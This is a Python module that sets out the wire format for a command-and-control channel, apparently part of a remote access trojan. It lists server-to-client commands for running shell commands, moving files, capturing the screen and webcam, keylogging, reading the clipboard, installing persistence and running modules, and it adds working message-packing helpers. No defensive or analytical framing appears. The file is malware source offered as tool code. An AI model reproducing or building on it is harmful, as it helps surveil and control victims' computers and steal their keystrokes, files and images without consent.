#!/usr/bin/env python3
"""Protocol definitions — wire format for C2 communications."""
import struct
import json

MAGIC = b"PHNT"

# Command types
CMD_REGISTER    = 0x01   # Client → Server: registration data
CMD_HEARTBEAT   = 0x02   # Client → Server: keepalive
CMD_SHELL       = 0x10   # Server → Client: execute shell command
CMD_SHELL_RESP  = 0x11   # Client → Server: shell output
CMD_UPLOAD      = 0x20   # Server → Client: upload file to client
CMD_DOWNLOAD    = 0x21   # Server → Client: download file from client
CMD_FILE_RESP   = 0x22   # Client → Server: file data
CMD_SCREEN      = 0x30   # Server → Client: capture screen
CMD_SCREEN_RESP = 0x31   # Client → Server: JPEG data
CMD_KEYLOG      = 0x40   # Server → Client: start/stop keylogger
CMD_KEYLOG_RESP = 0x41   # Client → Server: keystroke data
CMD_SYSINFO     = 0x50   # Server → Client: get system info
CMD_SYSINFO_RESP= 0x51   # Client → Server: system info JSON
CMD_PROCESS     = 0x60   # Server → Client: list/kill processes
CMD_PROCESS_RESP= 0x61   # Client → Server: process list
CMD_PERSIST     = 0x70   # Server → Client: install persistence
CMD_PERSIST_RESP= 0x71   # Client → Server: persistence result
CMD_WEBCAM      = 0x80   # Server → Client: capture webcam
CMD_WEBCAM_RESP = 0x81   # Client → Server: webcam JPEG
CMD_CLIPBOARD   = 0x90   # Server → Client: read/write clipboard
CMD_CLIP_RESP   = 0x91   # Client → Server: clipboard data
CMD_EXEC_MODULE = 0xA0   # Server → Client: execute named module
CMD_EXIT        = 0xFF   # Server → Client: disconnect

def pack_message(cmd_type: int, data: bytes) -> bytes:
    """Pack a message: [magic(4)][cmd_type(4)][data_len(4)][data]"""
    return struct.pack(">4sII", MAGIC, cmd_type, len(data)) + data

def unpack_header(header: bytes) -> tuple:
    """Unpack a 12-byte header. Returns (magic, cmd_type, data_len)."""
    if len(header) < 12:
        raise ValueError("Header too short")
    magic, cmd_type, data_len = struct.unpack(">4sII", header[:12])
    if magic != MAGIC:
        raise ValueError(f"Bad magic: {magic}")
    return magic, cmd_type, data_len

def pack_json(cmd_type: int, obj: dict) -> bytes:
    """Pack a JSON message."""
    return pack_message(cmd_type, json.dumps(obj).encode())

def unpack_json(data: bytes) -> dict:
    """Unpack JSON data."""
    return json.loads(data.decode())
